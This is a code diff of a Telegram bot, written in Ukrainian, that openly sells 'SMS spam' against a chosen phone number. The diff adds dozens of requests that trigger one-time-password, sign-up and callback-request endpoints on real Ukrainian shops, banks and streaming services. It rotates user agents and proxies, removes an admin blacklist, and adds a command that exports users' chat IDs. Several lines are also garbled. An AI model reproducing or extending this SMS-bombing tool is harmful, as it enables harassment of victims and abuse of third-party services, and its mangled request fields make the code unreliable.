@@ -77,8 +77,6 @@ def start(message):
 
     if int(message.chat.id) == ADMIN_CHAT_ID:
         buttons_to_add.append(types.KeyboardButton(text='🔥Розсилка'))
-        buttons_to_add.append(types.KeyboardButton(text='addbl'))
-        buttons_to_add.append(types.KeyboardButton(text='delbl'))
 
     keyboard.add(*buttons_to_add)
     bot.send_message(message.chat.id, 'Привіт🙋‍♂!\n\n<b>Завдяки цьому боті ти можеш запустити комусь спам смс</b>\n\n<b>Вибери дію:</b>',  reply_markup=keyboard, parse_mode='HTML')
@@ -88,7 +86,7 @@ def send_for_number_https(aa):
 
     ua = fake_useragent.UserAgent()
     headers = {
-        'user_agent': ua.random
+        'User-Agent': ua.random
     }
 
     messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']
@@ -138,10 +136,11 @@ def send_for_number_https(aa):
         "clientId": "1008992044.1662752535",
         "pageUrl": "https://city-drive.ua/user/register"})
         d = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,proxies=proxies, data={'mobileNumber':aa})
-        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, proxies=proxies, timeout=1.5, data={'phone': aa})
+        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, proxies=proxies,
+                          data={'phone': aa})
         d = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, proxies=proxies, data={'phone':aa})
         d = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers,proxies=proxies, data={'phone': uniq_number})
-        d = requests.post('https://kasta.ua/api/v2/ssr/login-form', headers=headers,proxies=proxies, timeout=1.5, data={'email': number_plus})
+        d = requests.post('https://kasta.ua/api/v2/ssr/login-form', headers=headers,proxies=proxies, data={'email': number_plus})
         requests.post('https://sundog.production.vidmind.com/sundog/graphql',headers=headers,proxies=proxies, json={
             "operationName": "GenerateOTP",
             "variables": {
@@ -172,7 +171,7 @@ def send_for_number_https(aa):
         "pageUrl": "https://anix.ua/ua/odnorazovye-elektronnye-sigarety"})
         d = requests.post('https://anc.ua/authorization/auth/v2/register',headers=headers,proxies=proxies, json={'login': f'{number_plus}'})
         d = requests.get(f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{aa}&code=&type=sms',headers=headers,proxies=proxies,)
-        d = requests.post('https://buketland.phonet.com.ua/rest/public/widget/call-catchers/02a157cf-3c3b-4bbd-9398-92b81a93b12c/call?timestamp=1662908228931&utcOffset=-180',headers=headers,proxies=proxies, timeout=1.5, json={
+        d = requests.post('https://buketland.phonet.com.ua/rest/public/widget/call-catchers/02a157cf-3c3b-4bbd-9398-92b81a93b12c/call?timestamp=1662908228931&utcOffset=-180',headers=headers,proxies=proxies, json={
         "phone": number_plus,
         "utm": {
             "source": "google",
@@ -186,8 +185,8 @@ def send_for_number_https(aa):
         "uaId": "UA-5timeout=1.5,07303-6",
         "clientId": "1717388277.1662908163",
         "pageUrl": "https://buketland.com.ua/index.php?route=account/success"})
-        d = requests.post('https://telemart.ua/auth/',headers=headers,proxies=proxies, timeout=1.5, data={'login': number_plus,'action': 'submitPassword','token': 'st'})
-        d = requests.post('https://credit7.ua/client/registration/general-information',headers=headers,proxies=proxies, timeout=1.5, data={'mobile_phone': f'{aa[:2]}{(aa[2:5])}{aa[5:8]} {aa[8:10]} {aa[10:12]}'})
+        d = requests.post('https://telemart.ua/auth/',headers=headers,proxies=proxies, data={'login': number_plus,'action': 'submitPassword','token': 'st'})
+        d = requests.post('https://credit7.ua/client/registration/general-information',headers=headers,proxies=proxies, data={'mobile_phone': f'{aa[:2]}{(aa[2:5])}{aa[5:8]} {aa[8:10]} {aa[10:12]}'})
         d = requests.post('https://vandalvape.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers,proxies=proxies, data={'phone': f'{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.post('https://f.ua/ajax/callback/',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','title': '','url': 'https://f.ua/','mail': '','notes': ''})
         d = requests.get(f'https://c2c.oschadbank.ua/api/sms/aa',headers=headers,proxies=proxies)
@@ -238,7 +237,7 @@ def send_for_number_https(aa):
         d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,proxies=proxies,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
         d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,proxies=proxies,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}',proxies=proxies)
-        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798113-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
+        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798proxies=proxies,3-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
         d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,proxies=proxies,data={'un': name,'uph': number_plus})
         d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
         d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,proxies=proxies,data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
@@ -246,6 +245,36 @@ def send_for_number_https(aa):
         d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers,proxies=proxies)
         d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,proxies=proxies,json={"phone": number_plus})
         d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,proxies=proxies,json={'phone': number_plus})
+        d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,proxies=proxies, data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1})
+        d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,proxies=proxies, data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
+        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,proxies=proxies, json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}',headers=headers,proxies=proxies,)
+        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,proxies=proxies, data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798proxies=proxies,3-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
+        d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,proxies=proxies, data={'un': name,'uph': number_plus})
+        d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,proxies=proxies, json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
+        d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,proxies=proxies, data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://agat-m.com.ua/send.php',headers=headers,proxies=proxies, data={'name': name,'phone': number_plus})
+        d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers,proxies=proxies)
+        d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,proxies=proxies, json={"phone": number_plus})
+        d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,proxies=proxies, json={'phone': number_plus})
+        d = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers,proxies=proxies)
+        d = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,proxies=proxies, json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": ua.random,"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa})
+        d = requests.post('https://crm.domoviy.com/ords/crm/ex/setord/',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}','url': 'domoviy.com/santehnik', 'dat': 175513092022})
+        d = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})
+        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,proxies=proxies, json={'name': name, 'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://angio.com.ua/send_login_code',headers=headers,proxies=proxies, data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','remember': 'false'})
+        d = requests.post('https://gepur.com/rapi/auth/register-retail-buyer',headers=headers,proxies=proxies, json={"email": email,"password": password,"phone": number_plus,"fio": f"{name} {surname} {name}"})
+        d = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,proxies=proxies, json={"phone_number": number_plus})
+        d = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',proxies=proxies, headers=headers)
+        d = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,proxies=proxies, json={'phone': number_plus})
+        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,proxies=proxies, data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})
+        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,proxies=proxies, data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})
+        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers,proxies=proxies, data={'phone': aa})
+        d = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers,proxies=proxies, data={'phone': aa})
+        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers,proxies=proxies, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})
+        d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers,proxies=proxies, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})
+        d = requests.post('https://auth.easypay.ua/api/check',headers=headers,proxies=proxies, json={"phone": aa})
+        d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers,proxies=proxies, json={'phone': aa})
         coun+=1
         print(f'Круг {coun}')
     except:
@@ -255,7 +284,7 @@ def send_for_number_https(aa):
 def send_for_number(aa):
     ua = fake_useragent.UserAgent()
     headers = {
-        'user_agent': ua.random
+        'User-Agent': ua.random
     }
 
     messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']
@@ -391,11 +420,10 @@ def send_for_number(aa):
     "pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"})
         d = requests.post('https://safari.dp.ua/ua/feedback/callback',headers=headers, data={'firstname': name,'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'callbackForm','isAjax': 1})
         d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1})
-        d = requests.post('https://vest.in.ua/index.php?route=extension/module/oct_popup_call_phone/send',headers=headers,data={'referer': 'https://vest.in.ua/ua/tehnika-i-elektronika/category-compyuterna-pereferiya/categoria-klaviatura/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDBmbIgBvL5q4ku4tRhYzu3o9povZONfxRVsiTVmBjnZKTad1TT95zhoC-pQQAvD_BwE','telephone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
         d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}')
-        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798113-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
+        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798proxies=proxies,3-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
         d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,data={'un': name,'uph': number_plus})
         d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
         d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
@@ -403,50 +431,29 @@ def send_for_number(aa):
         d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers)
         d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,json={"phone": number_plus})
         d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,json={'phone': number_plus})
+        d = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers)
+        d = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": ua.random,"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa})
+        d = requests.post('https://crm.domoviy.com/ords/crm/ex/setord/',headers=headers,data={'name': name,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}','url': 'domoviy.com/santehnik', 'dat': 175513092022})
+        d = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})
+        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={'name': name, 'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://angio.com.ua/send_login_code',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','remember': 'false'})
+        d = requests.post('https://gepur.com/rapi/auth/register-retail-buyer',headers=headers,json={"email": email,"password": password,"phone": number_plus,"fio": f"{name} {surname} {name}"})
+        d = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,json={"phone_number": number_plus})
+        d = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',headers=headers)
+        d = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,json={'phone': number_plus})
+        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})
+        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})
+        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers, data={'phone': aa})
+        d = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': aa})
+        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})
+        d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})
+        d = requests.post('https://auth.easypay.ua/api/check',headers=headers, json={"phone": aa})
+        d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers, json={'phone': aa})
         coun+=1
         print(f'Круг {coun}')
     except:
         print(d.text)
     print('все')
-
-@bot.message_handler(commands=["addbl"])
-def addbl(message):
-    try:
-        if message.chat.id == ADMIN_CHAT_ID:
-            newloser = f'{message.text[7:]}'
-            if newloser == '':
-                bot.send_message(ADMIN_CHAT_ID, "Введи номер id користувача")
-            else:
-                f = open('idBL.txt' , 'a')
-                f.write(f'{newloser}' + '\n')
-                f.close()
-                bot.send_message(ADMIN_CHAT_ID, "Добавлен новий користувач в чорний список: "+f'{newloser}')
-        else:
-            bot.send_message(message.chat.id, "Доступно тільки админу")
-    except:
-        pass
-
-@bot.message_handler(commands=['delbl'])
-def delbl(message):
-    try:
-        if message.chat.id == ADMIN_CHAT_ID:
-            idunban = f'{message.text[7:]}'
-            with open("idBL.txt") as file:
-                arrayBL = [row.strip() for row in file]
-                if idunban == '':
-                    bot.send_message(ADMIN_CHAT_ID, "Введи id користувача.")
-                elif idunban in arrayBL:
-                    sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
-                    f = open('idBL.txt', 'w')
-                    f.write(sss)
-                    f.close()
-                    bot.send_message(ADMIN_CHAT_ID, 'Готово.')
-                else:
-                    bot.send_message(ADMIN_CHAT_ID, 'Такого юзера не найдено')
-        else:
-            bot.send_message(message.chat.id, "Доступно тільки админу")
-    except:
-        pass
 
 def start_spam(chat_id, phone_number, force,second,prox,name):
     running_spams_per_chat_id.append(chat_id)
@@ -460,8 +467,12 @@ def start_spam(chat_id, phone_number, force,second,prox,name):
         if chat_id not in running_spams_per_chat_id:
             break
         if end > vv:
-            bot.send_message(chat_id,'Ти ввів забагато часу! треба вводити менше 300 секунд')
-            break
+            if name == 'Undefined':
+                pass
+            else:
+                bot.send_message(chat_id,'Ти ввів забагато часу! треба вводити менше 300 секунд')
+                break
+        
         
         if prox == '-':
             send_for_number(phone_number)
@@ -558,7 +569,7 @@ def handle_message_received(message):
             bot.send_message(chat_id, '<b>Введи номер без + в форматі:\n🇺🇦 380xxxxxxxxx seconds +/-\n</b>\nПриклад: 380xxxxxxxxx 50 +', parse_mode='HTML')
 
         elif text == '📈Статистика':
-            bot.send_message(chat_id, f'📊Статистика відображається в реальному часі!\nКористувачів🙎‍♂: {users_amount[0]}<b>\nВ боті 40 сервісів</b>', parse_mode='HTML')
+            bot.send_message(chat_id, f'📊Статистика відображається в реальному часі!\nКористувачів🙎‍♂: {users_amount[0]}<b>\nВ боті 69 сервісів</b>', parse_mode='HTML')
 
         elif text == '🔥Розсилка' and chat_id==ADMIN_CHAT_ID:
             bot.send_message(chat_id, 'Введи повідомлення в форматі: "РОЗІСЛАТИ: ваш_текст"')
@@ -572,22 +583,22 @@ def handle_message_received(message):
             else:
                 running_spams_per_chat_id.remove(chat_id)
 
-        elif text == 'addbl':
-            addbl(message)
-
-        elif text == 'delbl':
-            delbl(message)
-
         elif 'РОЗІСЛАТИ: ' in text and chat_id==ADMIN_CHAT_ID:
             msg = text.replace("РОЗІСЛАТИ: ","")
             send_message_users(msg)
         
         elif len(text) >= 12 <= 19:
-            sec = message.text.split()[1]
-            prox = message.text.split()[2]
-            num = message.text.split()[0]
-            phone = text
-            spam_handler(num, chat_id,sec,prox,name)
+            if '380' in text:
+                sec = message.text.split()[1]
+                prox = message.text.split()[2]
+                num = message.text.split()[0]
+                spam_handler(num, chat_id,sec,prox,name)
+            else:
+                bot.send_message(chat_id,'❌Номер не правильно введений!\nВін має починатися з 380')
+                
+        elif text == 'БД' and chat_id==ADMIN_CHAT_ID:
+            bot.send_document(chat_id,open('chat_ids.txt', 'rb'))
+            
 
         else:
             bot.send_message(chat_id, f'Номер введений неправильно. Введено {len(text)} символів, а треба 12')
